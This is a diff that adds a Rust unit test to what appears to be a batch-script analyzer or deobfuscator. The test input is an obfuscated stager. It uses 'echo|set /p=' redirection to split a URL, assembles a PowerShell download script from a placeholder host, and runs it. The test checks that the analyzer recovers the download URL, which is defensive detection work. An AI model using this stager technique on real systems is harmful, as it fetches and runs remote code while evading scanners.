@@ -23229,6 +23229,29 @@ echo %MARK%
     }
 
     #[test]
+    fn synth_set_p_prompt_append_joins_generated_script_without_newline() {
+        let report = crate::analyze(
+            br#"echo|set /p=Invoke-WebRequest -Uri h > stage.ps1
+echo|set /p=ttps://set-p-prompt-append.example/stage.ps1 >> stage.ps1
+powershell -NoProfile -File .\stage.ps1"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    crate::traits::Trait::Download { src, .. }
+                        if src == "https://set-p-prompt-append.example/stage.ps1"
+                )
+            }),
+            "set /p prompt redirection did not analyze generated script: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn synth_type_current_dir_nested_does_not_read_unrelated_basename_content() {
         let mut env = Environment::new(&Config::default());
         env.modified_filesystem.insert(
